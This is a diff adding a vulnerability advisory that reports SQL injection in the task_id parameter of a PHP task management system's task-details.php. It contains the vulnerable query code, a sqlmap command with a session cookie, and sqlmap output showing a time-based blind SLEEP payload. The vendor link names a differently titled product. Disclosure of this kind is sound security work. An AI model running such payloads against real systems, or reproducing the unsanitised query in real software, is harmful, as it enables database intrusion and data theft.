@@ -1,0 +1,41 @@
+php task management system - SQL Injection on (task-details.php?task_id=XX) 
+
+Vendor Homepage:
+https://www.sourcecodester.com/php/17217/employee-management-system-php-and-mysql-free-download.html
+
+Version:V1.0
+
+Tested on: PHP, Apache, MySQL
+
+Affected Page:
+task-details.php
+On this page task_id parameter is vulnerable to SQL Injection Attack
+ 
+Source Code(taskmatic/ task-details.php):
+$task_id = $_GET['task_id'];
+if(isset($_POST['update_task_info'])){
+    $obj_admin->update_task_info($_POST,$task_id, $user_role);
+}
+$page_name="Edit Task";
+include("include/sidebar.php");
+$sql = "SELECT a.*, b.fullname 
+FROM task_info a
+LEFT JOIN tbl_admin b ON(a.t_user_id = b.user_id)
+WHERE task_id='$task_id'";
+$info = $obj_admin->manage_all_info($sql);
+$row = $info->fetch(PDO::FETCH_ASSOC);
+
+Proof of vulnerability(Verify using the sqlmap tool):
+-> sqlmap -u http://localhost/taskmatic/task-details.php\?task_id\=42 --cookie="Cookie:PHPSESSID=cckdidvs9fj069pko7q9au070s" --batch --current-user
+Output:
+sqlmap identified the following injection point(s) with a total of 77 HTTP(s) requests:
+---
+Parameter: task_id (GET)
+    Type: time-based blind
+    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
+    Payload: task_id=42' AND (SELECT 3897 FROM (SELECT(SLEEP(5)))Zlza) AND 'IENl'='IENl
+---
+[05:09:24] [INFO] the back-end DBMS is MySQL
+current user: 'root@localhost'
+
+
